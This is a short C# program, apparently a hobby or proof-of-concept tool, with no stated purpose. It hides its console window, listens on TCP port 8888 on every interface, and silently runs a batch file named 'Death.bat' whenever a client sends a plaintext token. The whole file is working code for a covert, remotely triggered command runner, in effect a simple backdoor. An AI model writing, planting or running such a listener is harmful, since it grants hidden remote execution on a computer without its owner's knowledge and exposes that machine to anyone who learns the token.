using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;

[DllImport("kernel32.dll")]
static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
const int SW_HIDE = 0;
var handle = GetConsoleWindow();
ShowWindow(handle, SW_HIDE);


var ipAdress = IPAddress.Any;
IPEndPoint iPEndPoint = new IPEndPoint(ipAdress, 8888);
TcpListener server = new TcpListener(iPEndPoint);
string token = "some token";
string batFilePath = "Death.bat";
try
{
    server.Start();
    while (true)
    {
        TcpClient client = await server.AcceptTcpClientAsync();
        
        _ = Task.Run(async () => ListenForMessage(client));
    }
}
finally
{
    server.Stop();
}


async void ListenForMessage(TcpClient client)
{
    NetworkStream stream = client.GetStream();
    byte[] buffer = new byte[client.ReceiveBufferSize];
    int bytesRead = 0;
    while (client.Connected)
    {
        try
        {
            bytesRead = stream.Read(buffer, 0, client.ReceiveBufferSize);
        }
        catch
        {
            break;
        }
        if (bytesRead > 0)
        {
            string message = Encoding.UTF8.GetString(buffer, 0, bytesRead);
            if (message == token)
            {
                Process process = new Process();
                process.StartInfo.FileName = batFilePath;
                process.StartInfo.UseShellExecute = true; 
                process.StartInfo.CreateNoWindow = true;

                process.Start();
            }
        }
        else
        {
            break;
        }
    }
}


















